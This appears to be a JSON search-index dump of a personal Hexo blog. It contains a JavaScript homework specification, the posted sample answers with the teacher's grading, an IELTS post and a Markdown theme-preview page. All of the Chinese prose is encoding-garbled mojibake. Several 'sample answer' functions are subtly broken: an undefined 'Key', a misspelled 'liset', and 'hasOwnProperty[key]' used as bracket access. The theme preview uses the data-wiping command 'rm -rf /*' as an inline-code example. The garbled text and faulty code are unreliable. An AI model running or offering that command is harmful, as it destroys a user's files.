å¯èƒ½è¦æš‚æ—¶å‘Šä¸€æ®µè½äº†ã€‚<br>é€šè¿‡é›…æ€ï¼Œè¿™ä¸¤ä¸ªæœˆå…»æˆäº†ä¸€ä¸ªè‰¯å¥½çš„ä¹ æƒ¯ï¼Œå°±æ˜¯æ—©ç¡æ—©èµ·ï¼Œå¸Œæœ›æ¥ä¸‹çš„æ—¥å­é‡Œèƒ½å¤Ÿç»§ç»­ä¿æŒã€‚è¿˜æœ‰ä»»åŠ¡è§„åˆ’å’Œæ—¶é—´åˆ†é…è¿˜å­˜åœ¨é—®é¢˜ï¼Œè¿˜èƒ½å¤Ÿæå‡ã€‚\"You could have done better.\"\n\nä»Šå¤©è€ƒå…­çº§ï¼ŒåŒå­¦ä»¬è¯´ä½ é›…æ€éƒ½ 7 åˆ†äº†è¿˜è€ƒä»€ä¹ˆå…­çº§å•Šã€‚ã€‚ã€‚è¿™æ˜¯æˆ‘ç¬¬ä¸‰æ¬¡è€ƒå…­çº§äº†ï¼Œç¬¬ä¸€æ¬¡æ²¡è¿‡ï¼Œç¬¬äºŒæ¬¡å¼ƒè€ƒäº†ï¼Œç¬¬ä¸‰æ¬¡ä¸å¤šæƒ³äº†ï¼Œè¿˜æ˜¯ä¸€æ ·ï¼Œèƒ½è¿‡æœ€å¥½ï¼Œè¿‡ä¸äº†å†è¯´ï¼Œä¸‹å­¦æœŸä¸æƒ³å†è€ƒäº†ã€‚\n\n**æ¥ä¸‹æ¥å­¦å¹´çš„ç›®æ ‡ -- Coding!**","tags":["IELTS"]},{"title":"Assignment Sample Answer","url":"/2017/06/08/sample-answer/","content":"\nè¿™ä¸¤å‘¨æ¥è‡ª [UWLAX](https://www.uwlax.edu/) çš„å¤–æ•™ [Kenny Hunt](http://charity.cs.uwlax.edu/#/) å¯¹æˆ‘ä»¬è¿›è¡Œä¸¤å‘¨çš„ [Web Programming](http://charity.cs.uwlax.edu/scun/web/) è¯¾ç¨‹æ•™å­¦,ä»‹ç»åŸºæœ¬è¯­æ³•ç”¨æ³•åï¼Œå¸ƒç½®äº†ä¸€ç¯‡ä½œä¸šï¼Œä¸‹é¢é™„ä¸Š Sample Answerã€‚\n\nè¿™æ˜¯ä½œä¸šçš„åŸé“¾æ¥ => [JavaScript Assignment](http://charity.cs.uwlax.edu/scun/web/assignments/hw1/)\n\nä¸ºé˜²æ­¢å¤–æ•™å›å›½åï¼Œé¡µé¢è¢«åˆ é™¤æ— æ³•è®¿é—®ï¼Œæˆ‘è¿™é‡ŒæŠŠä½œä¸šå­˜åœ¨ [è¿™ç¯‡æ–‡ç« ](https://greenlihui.github.io/2017/06/08/javascript-assignment/) é‡Œäº†\n\n## Risk\n```JavaScript\nfunction risk(height, weight, sex) {\n  var meterOfHeight = height * 0.0254;\n  var kiloOfWeight = weight * 0.4536;\n  var bmi = kiloOfWeight / Math.pow(meterOfHeight, 2);\n  return ( sex == 'M' && (bmi < 20.4 || bmi > 31.9) ) ||\n  ( sex == 'F' && (bmi < 19.4 || bmi > 27.6) );\n}\n```\n\n## Hail Caesar\n```JavaScript\nfunction roman(number) {\n  var numberToRoman = {\n    1 : \"I\",\n    2 : \"II\",\n    3 : \"III\",\n    4 : \"IV\",\n    5 : \"V\",\n    6 : \"VI\",\n    7 : \"VII\",\n    8 : \"VIII\",\n    9 : \"IX\",\n    10 : \"X\"\n  };\n  var romanToNumber = {\n    \"I\" : 1,\n    \"II\" : 2,\n    \"III\" : 3,\n    \"IV\" : 4,\n    \"V\" : 5,\n    \"VI\": 6,\n    \"VII\" : 7,\n    \"VIII\" : 8,\n    \"IX\" : 9,\n    \"X\" : 10\n  };\n  if (typeof number == 'number') {\n    return numberToRoman[number];\n  } else if (typeof number == 'string') {\n    return romanToNumber[number.toUpperCase()];\n  } else {\n    return undefined;\n  }\n}\n```\n\n## Follow the Leader\n```JavaScript\nfunction lettersThatFollow(text, ch) {\n  var result = \"\";\n  var phrases = text.split(ch).slice(1);\n\n  phrases.map(ph => ph[0]).forEach(c => {\n    if ( c && result.indexOf(c) < 0 ) {\n      result += c;\n    }\n  });\n  return result;\n}\n```\n\n## Props to JavaScript\n```JavaScript\nfunction props(list, propertyName) {\n  return list.map(val => val[propertyName]);\n}\n```\n\n## JavaScript to HTML\n```JavaScript\nfunction toHTML(list) {\n  if (typeof list != 'object') {\n    return \"<li>\" + list + \"</li>\";\n  } else {\n    return \"<ol>\" + list.map(toHTML).join('') + \"</ol>\";\n  }\n}\n```\n\n## One Step After The Other\n```JavaScript\nfunction sequence(start, step) {\n  var count = 0;\n\n  return function() {\n    return start + step * count++;\n  };\n}\n```\n\n## Over and Over Again\n```JavaScript\nfunction repeat(text, n) {\n  return repeatf(() => text, n).join('');\n}\n```\n\n## Over and Over Again and Again\n```JavaScript\nfunction repeatf(f, n) {\n  var result =[];\n  for (var i = 0; i < n; i++) {\n    result.push(f());\n  }\n  return result;\n}\n```\n\n## The Matchmaker\n```JavaScript\nfunction matchmaker(obj) {\n  return function (object) {\n    for (var key in obj) {\n      if (obj[key] != object[Key]) {\n        return false;\n      }\n    }\n    return true;\n  };\n}\n```\n\n## Breaking Up is Hard To Do\n```JavaScript\nfunction breakup(list, partitioner) {\n  var result = {};\n  list.forEach(val => {\n    var key = partitioner(val);\n    if (! result.hasOwnProperty[key]) {\n      result[key] = [];\n    }\n    result[key].push(val);\n  });\n  return result;\n}\n```\n\n## All For One and One For All\n```JavaScript\nfunction eachOne(list) {\n  for (var i = 0; i < liset.length; i++) {\n    if (!list[i]) {\n      return list[i];\n    }\n  }\n  return true;\n}\n```\n\n## NoSql Query\n```JavaScript\nfunction noSql(list, query) {\n  return list.filter(matchmaker(query));\n}\n```\n\n## Once and Only Once\n```JavaScript\nfunction justOnce(f) {\n  var hasBeenCalled = false;\n  var value;\n\n  return function() {\n    if(hasBeenCalled) {\n      return value;\n    } else {\n      value = f();\n      hasBeenCalled = true;\n      return value;\n    }\n  };\n}\n```\n\n## æˆ‘çš„æ‰“åˆ†\nä¸Šé¢æ˜¯è€å¸ˆè¯„è®²é¢˜ç›®åç»™å‡ºçš„å‚è€ƒç­”æ¡ˆï¼Œæˆ‘åŸæœ¬æäº¤çš„ç­”æ¡ˆåªæ‹¿äº†ä¸€ä¸ª AB\nè¿™æ˜¯è€å¸ˆç»™æˆ‘çš„æ‰“åˆ†\n> Here are my notes on your assignment: \n> <br>\n> 1\\) the code is well written\n> 2\\) You have a couple of variables named \"Key\".  Never start a variable name with a capital letter.\n> 3\\) The breakup function is almost correct. You need to be carful about truthiness - in this case it is a problem with \"result[key] ? ...\".  Try result.hasOwnProperty(key) ?  \n> <br>\n> Score: 90% (the justOnce function is not given) This is an \"AB\".\n\n## æ–‡ä»¶\n[æˆ‘æäº¤çš„ä½œä¸š](/assets/my-homework.js) å’Œ [è€å¸ˆçš„ç­”æ¡ˆ](/assets/sample%20answer.js)\n","tags":["JavaScript","UWLAX"]},{"title":"JavaScript Assignment","url":"/2017/06/08/javascript-assignment/","content":"\n# æ¥è‡ªå¤–æ•™çš„ JavaScript ä½œä¸š\n[åŸä½œä¸šç½‘å€](http://charity.cs.uwlax.edu/scun/web/assignments/hw1/)\n\n## Overview\nIn this assignment you will write several JavaScript functions. These function require that you use most aspects of the language; conditionals, loops, arrays, strings and functions-as-first-class citizens. Each of the functions must be placed within a single file named homework1.js which is the only deliverable for this assignment.\n\n### Risk\n`risk(height, wieght, sex)`\n\nThis function accepts three inputs. The first input is a number that denotes the height (in inches) of a person. The second input is a number that denotes the weight of a person (in pounds). The third input is a string that denotes the sex of a person. The sex is â€œMâ€ for male and â€œFâ€ for female. This function returns true if the person is at risk and false if they are not. A person is at risk if\n\n- they are male and have a BMI less than 20.4 or greather than 31.9\n- they are female and have a BMI less than 19.4 or greather than 27.6\n\nBody Mass Index (BMI) is defined as a persons weight (in kilograms) divided by the square of their height (in meters).\n\n**Examples**\n- risk(71.5, 175.3, 'M') => false\n- risk(65.2, 230.5, 'M') => true\n- risk(65.2, 110, 'F') => true\n\n### Hail Caesar\n`roman(number)`\n\nThis function accepts a single input. The input is either a number or a String. If it is a number, it is a base-10 number in the interval [1, 10]. If it is a String, it is a case-insensitive roman-numeral in the interval [1, 10]. If the input is a Number, in [1, 10], the function returns the corresponding Roman numeral as a String. If the input is a roman-numeral String in the interval [1, 10], then the function returns the corresponding decimal number. This function returns undefined for all other usages.\nStatue of Caesar\n\n**Examples**\n- roman('VII') => 7\n- roman('vIi') => 7\n- roman( 9 ) => 'IX'\n- roman( 128 ) => undefined\n- roman( 'Hello' ) => undefined\n- roman( roman ) => undefined\n\n### Follow the Leader\n`lettersThatFollow( text, ch )`\n\nThis function accepts two strings: a string named text and a string name ch. The function must search through the text for all occurrences of ch in text and, for each occurrence of ch, return the character that immediately follows ch in text if such a character exists. The order of the characters in the output string is undefined. The result must be a string that contains no duplicate characters.\n\n**Examples**\n- lettersThatFollow(\"I nearly laughed when the fat man sat on his hat.\", \"a\") => \"rutn\"\n- lettersThatFollow(\"I nearly laughed when the fat man sat on his hat.\", \"z\") => \"\"\n- lettersThatFollow(\"I nearly laughed when the fat man sat on his hat.\", \".\") => \"\"\n\n### Props to JavaScript\n`props( list, propertyName)`\n\nThis function takes a list of elements and a propertyName string as input. The function returns a list that is generated by obtaining the property-named value of an input element. If a list element doesn't have a property of the specified name, then its value is given as undefined.\n\n**Examples**\n- var testing = [{ a:3, b:â€˜Catâ€™, c:true }, 13, { a:12, b:â€˜Hatâ€™, c:false }, { cat:3, hat:â€˜3â€™, rat:false } ];\n- props( testing, â€˜bâ€™ ) => [ â€˜Catâ€™, undefined, â€˜Hatâ€™, undefined ]\n- props( testing, â€˜aâ€™ ) => [3, undefined, 12, undefined ]\n- props( testing, â€˜catâ€™ ) => [undefined, undefined, undefined, 3 ]\n\n### JavaScript to HTML\n`toHTML( list )`\n\nThis function takes an array of elements as its only input. The function converts the input list into a valid HTML ordered list. If any element of the list is a list, the output is a nested list of elements such that the first element of the inner list is an item in the outer list and every other element is within the nested list.\n\n**Examples**\n- toHTML( [] ) =&gt; '&lt;ol&gt;&lt;/ol&gt;'\n- toHTML( [1, 2] ) =&gt; '&lt;ol&gt;&lt;li&gt;1&lt;/li&gt;&lt;li&gt;2&lt;/li&gt;&lt;/ol&gt;'\n- toHTML( [1, 2, [3, 4, 5], 6] ) =&gt;\n\"&lt;ol&gt;&lt;li&gt;1&lt;/li&gt;&lt;li&gt;2&lt;/li&gt;&lt;li&gt;3&lt;ol&gt;&lt;li&gt;4&lt;/li&gt;&lt;li&gt;5&lt;/li&gt;&lt;/ol&gt;&lt;/li&gt;&lt;li&gt;6&lt;/li&gt;&lt;/ol&gt;\"\n\n### One Step After The Other\n`sequence( start, step )`\n\nThis function takes two numeric inputs, start and stop, and returns a function of no inputs. The resulting function will generate a sequence of values beginning with start and offset by step Each function call will generate the next value in the sequence.\n\n**Examples**\n- var x = sequence( 3, 15 );\n- [ x(), x(), x() ] => [ 3, 18, 33 ]\n- var y = sequence( 28, -5 );\n- [ y(), y(), y() ] => [ 28, 23, 18 ]\n\n### Over and Over Again\n`repeat( text, n )`\n\nThis function accepts a string (text) and an integer number (n). The function must return a string that has n repetitions of text. If n is non-positive this function must return the empty string.\n\n**Examples**\n- repeat( \"cow\", 3 ) => \"cowcowcow\"\n- repeat( \"alf\", 10 ) => \"alfalfalfalfalfalfalfalfalfalf\"\n- repeat( \"repeat\", -3 ) => \"\"\n\n### Over and Over Again and Again\n`repeatf( f, n )`\n\nThis function accepts a function of no arguments ( f ) and an integer number ( n ). The function must return a list that contains the results of n executions of f. If n is non-positive this function must return the empty list.\n\n**Examples**\n- repeatf( () => { return \"cow\"; } , 3 ) => [ \"cow\", \"cow\", \"cow\" ]\n- repeatf( function() { return 3; }, 2 ) => [ 3, 3 ]\n- repeatf( sequence( 3, 15 ), 3 ) => [ 3, 18, 33 ]\n\n### The Matchmaker\n`matchmaker( obj )`\n\nThis function accepts an object (obj) and returns a predicate function. The predicate function accepts a single input and returns true if the input contains all of the key/value properties of obj.\n\n**Examples**\n- var m = matchmaker( { a : 'b', c : 3 } );\n- m( { a : 'b', c : 3, d : true } ) => true\n- m( { a : 'b', c : 4, d : true } ) => false\n- m( 328 ) => false\n\n### Breaking Up is Hard To Do\n`breakup( list , partitioner )`\n\nThis function accepts two inputs: a list of elements and a function that accepts an element from the list. The result is an object whose properties correspond to the items returned by the partitioner and whose values are lists of elements that generated that property.\n\n**Examples**\n- breakup( [ 1, 2, 3, 5, 6, 7 ], (x) => { return x % 2 == 0; } ) => { true:[ 2, 6 ], false:[ 1, 3, 5, 7 ] }\n- breakup( [ 1.3, 5.1, 1.1, 4.3, 5.5 ], Math.floor ) => { 1:[ 1.3, 1.1 ], 4:[ 4.3 ], 5:[ 5.1, 5.5 ] }\n-  breakup( [â€œcatâ€, â€œbatâ€, â€œratâ€, â€œhorseâ€, â€œponyâ€], function(s) { return s.length; } ) => { 3:[â€œcatâ€, â€œbatâ€, â€œratâ€], 4:[â€œponyâ€], 5:[â€œhorseâ€] }\n\n### All For One and One For All\n`eachOne( list )`\n\nThis function accepts a list of elements as itâ€™s only input. The method returns â€˜trueâ€™ if every element in the list is truthy; otherwise it returns the first falsey element.\n\n**Examples**\n- eachOne( [ 0, 1, 2, 3 ] ) => 0\n- eachOne( [ 1, 2, 3, 4 ] ) => true\n- eachOne( [ 'a', [], 3, '', null ] ) => ''\n\n### NoSql Query\n`noSql( list, query )`\n\nThis function accepts a list of elements and an object known as the query. The method returns a list of all elements that have each of the key/value properties of the query.\n\n**Examples**\n- var objects = [ { public : true, name : \"Lion King\" }, { public : true, name : 'Dumbo' }, { public : false, name : 'Lion King' }, { name : 'Xeon', rating : 5 } ];\n- noSql( objects, { public:true } ) => [ { public:true, name:'Lion King' }, { public:true, name:'Dumbo'}]\n- noSql( objects, { name:'Lion King' } ) => [ { public:true, name:'Lion King' }, { public:false, name:'Lion King'}]\n- noSql( objects, { rating:5 } ) => [ { name:'Xeon', rating:5 } ]\n- noSql( objects, { public:false, name:'Dumbo' } ) => [ ]\n\n### Once and Only Once\n`justOnce( f )`\n\nThis function accepts a function â€˜fâ€™ as input and creates a version of the function that can only be called one time. Repeated calls to the resulting function will return the value from the original call.\n\n**Examples**\n- var a = justOnce( Math.max );\n- a( 3, 12 ) => 12\n- a( 51, -2) => 12\n- a( 6 ) => 12\n- a( ) => 12\n- var b = justOnce( function() { return new Date(); } );\n- b( ) => â€œWed Aug 20 2015 08:28:49 GMT-0500 (CDT)â€\n- b( ) => â€œWed Aug 20 2015 08:28:49 GMT-0500 (CDT)â€\n- b( 33 ) => â€œWed Aug 20 2015 08:28:49 GMT-0500 (CDT)â€\n- b( â€œaâ€, â€œbâ€, â€œcâ€) => â€œWed Aug 20 2015 08:28:49 GMT-0500 (CDT)â€\n","tags":["JavaScript","UWLAX"]},{"title":"ä¸»é¢˜é¢„è§ˆ","url":"/2017/01/01/theme-preview/","content":"\n# æ ‡é¢˜\n# è¿™é‡Œæ˜¯ h1\n\n## è¿™é‡Œæ˜¯ h2\n\n### è¿™é‡Œæ˜¯ h3\n\n#### è¿™é‡Œæ˜¯ h4\n\n##### è¿™é‡Œæ˜¯ h5\n\n###### è¿™é‡Œæ˜¯ h6\n\n```\n# è¿™é‡Œæ˜¯ h1\n## è¿™é‡Œæ˜¯ h2\n### è¿™é‡Œæ˜¯ h3\n#### è¿™é‡Œæ˜¯ h4\n##### è¿™é‡Œæ˜¯ h5\n###### è¿™é‡Œæ˜¯ h6\n```\n\n## æ®µè½\n\næ®µè½ä¸€æ®µè½ä¸€æ®µè½ä¸€æ®µè½ä¸€æ®µè½ä¸€æ®µè½ä¸€æ®µè½ä¸€æ®µè½ä¸€æ®µè½ä¸€æ®µè½ä¸€æ®µè½ä¸€æ®µè½ä¸€æ®µè½ä¸€æ®µè½ä¸€æ®µè½ä¸€æ®µè½ä¸€æ®µè½ä¸€æ®µè½ä¸€æ®µè½ä¸€æ®µè½ä¸€æ®µè½ä¸€æ®µè½ä¸€æ®µè½ä¸€æ®µè½ä¸€æ®µè½ä¸€æ®µè½ä¸€æ®µè½ä¸€æ®µè½ä¸€æ®µè½ä¸€æ®µè½ä¸€æ®µè½ä¸€æ®µè½ä¸€æ®µè½ä¸€æ®µè½ä¸€æ®µè½ä¸€æ®µè½ä¸€æ®µè½ä¸€æ®µè½\n\næ®µè½äºŒæ®µè½äºŒæ®µè½äºŒæ®µè½äºŒæ®µè½äºŒæ®µè½äºŒæ®µè½äºŒæ®µè½äºŒæ®µè½äºŒæ®µè½äºŒæ®µè½äºŒæ®µè½äºŒæ®µè½äºŒæ®µè½äºŒæ®µè½äºŒæ®µè½äºŒæ®µè½äºŒæ®µè½äºŒæ®µè½äºŒæ®µè½äºŒæ®µè½äºŒæ®µè½äºŒæ®µè½äºŒæ®µè½äºŒæ®µè½äºŒæ®µè½äºŒæ®µè½äºŒæ®µè½äºŒæ®µè½äºŒæ®µè½äºŒæ®µè½äºŒæ®µè½äºŒæ®µè½äºŒæ®µè½äºŒæ®µè½äºŒæ®µè½äºŒæ®µè½äºŒæ®µè½\n\n## è¶…é“¾æ¥\n\n[baidu](https://www.baidu.com/)\n\n```\n[baidu](https://www.baidu.com/)\n```\n\n## å¼•ç”¨\n### å•è¡Œ\n> è¿™é‡Œæ˜¯å¼•ç”¨\n\n```\n> è¿™é‡Œæ˜¯å¼•ç”¨\n```\n\n### åµŒå¥—\n> Blockquotes can also be nested...\n> > ...by using additional greater-than signs right next to each other...\n> >\n> > > ...or with spaces between arrows.\n\n```md\n> Blockquotes can also be nested...\n>> ...by using additional greater-than signs right next to each other...\n> > > ...or with spaces between arrows.\n```\n\n## Emphasis\n**This is bold text**\n\n__This is bold text__\n\n*This is italic text*\n\n_This is italic text_\n\n~~Strikethrough~~\n\n```\n**This is bold text**\n\n__This is bold text__\n\n*This is italic text*\n\n_This is italic text_\n\n~~Strikethrough~~\n```\n\n## åˆ—è¡¨\n\n### æ— åºåˆ—è¡¨\n\n+ aaa\n- bbb\n- ccc\n  * ddd\n  - eee\n    - fff\n  * ggg\n- aaa\n\n```md\n+ aaa\n- bbb\n- ccc\n  * ddd\n  - eee\n    - fff\n  * ggg\n- aaa\n```\n\n\n### æœ‰åºåˆ—è¡¨\n\n1. aaa\n2. bbb\n3. ccc\n   1. aaa\n   2. bbb\n      1. ccc\n   3. ccc\n4. ddd\n\n```md\n1. aaa\n2. bbb\n3. ccc\n   1. aaa\n   2. bbb\n      1. ccc\n   3. ccc\n4. ddd\n```\n\n## åˆ†å‰²çº¿\n\n---\n\n***\n___\n\n```md\n---\n\n***\n\n___\n```\n\n## å›¾ç‰‡\n![icon](https://blog-pics-1302502188.cos.ap-shanghai.myqcloud.com/20200624191541.png)\n\n```md\n![icon](https://blog-pics-1302502188.cos.ap-shanghai.myqcloud.com/20200624191541.png)\n```\n\n## ä»£ç è¡Œ\n\nè¿™æ˜¯ä¸€æ®µæ–‡å­—`rm -rf /*`è¿™æ˜¯ä¸€æ®µæ–‡å­—\n\n```\nè¿™æ˜¯ä¸€æ®µæ–‡å­—`rm -rf /*`è¿™æ˜¯ä¸€æ®µæ–‡å­—\n```\n\n## ä»£ç å—\n\n\n```javascript\nvar addLoadEvent = function (func) {\n  var oldonload = window.onload\n  if (typeof window.onload != 'function') {\n    window.onload = func\n  } else {\n    window.onload = function () {\n      oldonload()\n      func()\n    }\n  }\n}\n```\n\n\n## è¡¨æ ¼æµ‹è¯•\n\n| Header | Header | Header |\n| ------ | ------ | ------ |\n| aaa    | bb     | ccc    |\n| test   | hello  | hi     |\n\n```md\n| Header | Header | Header |\n| ------ | ------ | ------ |\n| aaa    | bb     | ccc    |\n| test   | hello  | hi     |\n```\n\n## Markdown-it Plugins\n\n### Task List\n- [ ] Mercury\n- [x] Venus\n- [ ] Comet Haley\n\n```md\n- [ ] Mercury\n- [x] Venus\n- [ ] Comet Haley\n```\n\n### Emoji\n:frowning: :blush: :confused:\n\n```md\n:frowning: :blush: :confused:\n```\n\nä½¿ç”¨æ–¹æ³•\n1. åœ¨ [EmojiCopy](https://www.emojicopy.com/) ä¸­å¤åˆ¶ç²˜è´´\n2. [Emoji Cheetsheet](https://github.com/markdown-it/markdown-it-emoji/blob/master/lib/data/full.json)\n3. [Emoji Shortcut](https://github.com/markdown-it/markdown-it-emoji/blob/master/lib/data/shortcuts.js)\n\n### ä¸Šæ ‡å’Œä¸‹æ ‡\n19^th^\n\nH~2~O\n\n```md\n19^th^\nH~2~O\n```\n\n### Image Size\n![icon](https://blog-pics-1302502188.cos.ap-shanghai.myqcloud.com/20200624191541.png =100x100)\n\n```md\n![icon](https://blog-pics-1302502188.cos.ap-shanghai.myqcloud.com/20200624191541.png =100x100)\n```\n\n### Attributes\nç»™è¿™ä¸ªæ®µè½æ·»åŠ ä¸€ä¸ª class {.red}\n<style>.red{color: red;}</style>\n\nè¿™ä¸ªæ®µè½æ·»åŠ ä¸€ä¸ªå±æ€§ {style=\"color:green\"}\n\n```md\nç»™è¿™ä¸ªæ®µè½æ·»åŠ ä¸€ä¸ª class {.red}\n<style>.red{color: red;}</style>\n\nè¿™ä¸ªæ®µè½æ·»åŠ ä¸€ä¸ªå±æ€§ {style=\"color:green\"}\n```\n\n### Footnotes\nFootnote 1 link[^first].\n\nFootnote 2 link[^second].\n\nInline footnote^[Text of inline footnote] definition.\n\nDuplicated footnote reference[^second].\n\n[^first]: Footnote **can have markup**\n\n    and multiple paragraphs.\n\n[^second]: Footnote text.\n\n```md\nFootnote 1 link[^first].\n\nFootnote 2 link[^second].\n\nInline footnote^[Text of inline footnote] definition.\n\nDuplicated footnote reference[^second].\n\n[^first]: Footnote **can have markup**\n\n    and multiple paragraphs.\n\n[^second]: Footnote text.\n```\n\n### ç¼©å†™\nThis is HTML abbreviation example.\n\nIt converts \"HTML\", but keep intact partial entries like \"xxxHTMLyyy\" and so on.\n\n*[HTML]: Hyper Text Markup Language\n\n```md\nThis is HTML abbreviation example.\n\nIt converts \"HTML\", but keep intact partial entries like \"xxxHTMLyyy\" and so on.\n\n*[HTML]: Hyper Text Markup Language\n```\n\n### Mark\n==mark==\n\n```md\n==mark==\n```\n\n### Container\n::: info\n**INFO**\nhere be info\n:::\n\n::: success\n**SUCCESS**\nhere be success\n:::\n\n::: warning\n**WARNING**\nhere be warning\n:::\n\n::: danger\n**DANGER**\nhere be danger\n:::\n\n```md\n::: info\n**INFO**\nhere be info\n:::\n\n::: success\n**SUCCESS**\nhere be success\n:::\n\n::: warning\n**WARNING**\nhere be warning\n:::\n\n::: danger\n**DANGER**\nhere be danger\n:::\n```\n\n## æ•°å­¦å…¬å¼\n### è¡Œå†…å…¬å¼\n$\\frac{\\partial u}{\\partial t}\n= h^2 \\left( \\frac{\\partial^2 u}{\\partial x^2} +\n\\frac{\\partial^2 u}{\\partial y^2} +\n\\frac{\\partial^2 u}{\\partial z^2}\\right)$\n\n```md\n$\\frac{\\partial u}{\\partial t}\n= h^2 \\left( \\frac{\\partial^2 u}{\\partial x^2} +\n\\frac{\\partial^2 u}{\\partial y^2} +\n\\frac{\\partial^2 u}{\\partial z^2}\\right)$\n```\n\n### è¡Œé—´å…¬å¼\n$$\n\\\\begin{aligned}\nx\\_{f} = & x\\_0+k(x-x\\_0) \\\\\\\\\ny\\_{f} = & y\\_0+k(y-y\\_0) \\\\\\\\\ns\\_{f} = & k\n\\\\end{aligned}\n$$\n\n```md\n\\\\begin{aligned}\nx\\_{f} = & x\\_0+k(x-x\\_0) \\\\\\\\\ny\\_{f} = & y\\_0+k(y-y\\_0) \\\\\\\\\ns\\_{f} = & k\n\\\\end{aligned}\n```\n\n## æ’å…¥ iframe\n<iframe src=\"//player.bilibili.com/player.html?aid=285774045&bvid=BV1uf4y127Ab&cid=196316963&page=1\" scrolling=\"no\" border=\"0\" frameborder=\"no\" framespacing=\"0\" allowfullscreen=\"true\"> </iframe>\n\n## æ’å…¥ html\n\n<div id=\"html\"></div>\n<style>\n#html{\n    height: 30px;\n    background: linear-gradient(90deg, rgba(255,0,0,1) 0%, rgba(0,255,0,1) 50%, rgba(0,0,255,1) 100%);\n    border-radius: 4px;\n}\n</style>\n\n```html\n<div id=\"html\"></div>\n<style>\n#html{\n    height: 30px;\n    background: linear-gradient(90deg, rgba(255,0,0,1) 0%, rgba(0,255,0,1) 50%, rgba(0,0,255,1) 100%);\n    border-radius: 4px;\n}\n</style>\n```\n","tags":["hexo"]}]